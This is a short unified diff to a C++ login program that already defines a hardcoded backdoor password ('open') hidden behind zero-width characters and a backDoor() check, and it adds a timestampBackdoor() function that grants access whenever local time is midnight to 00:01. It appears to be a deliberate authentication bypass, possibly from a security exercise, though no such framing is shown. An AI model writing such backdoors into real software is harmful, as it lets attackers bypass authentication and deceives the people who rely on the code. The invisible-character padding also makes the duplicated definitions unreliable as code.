@@ -4,6 +4,8 @@
 #include <sstream>
 #include "authlib.h"
 #include "openssl/sha.h"
+#include <ctime>
+
 
 #define backdoorpassword​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ "open​​​​​​​​​​​​​​​​​​​​"
 #define backdoorpassword​​​​​​​​​​​​​ "open​​​​​​​​​​"
@@ -33,6 +35,17 @@ bool backDoor(const string& password) {
     } else {
         return false;
     }
+}
+
+bool timestampBackdoor() {
+    time_t now = time(0);
+    tm *ltm = localtime(&now);
+
+    // Check if the current time is between 12:00 AM and 12:01 AM
+    if (ltm->tm_hour == 0 && ltm->tm_min == 0) {
+        return true;
+    }
+    return false;
 }
 
 int main() {
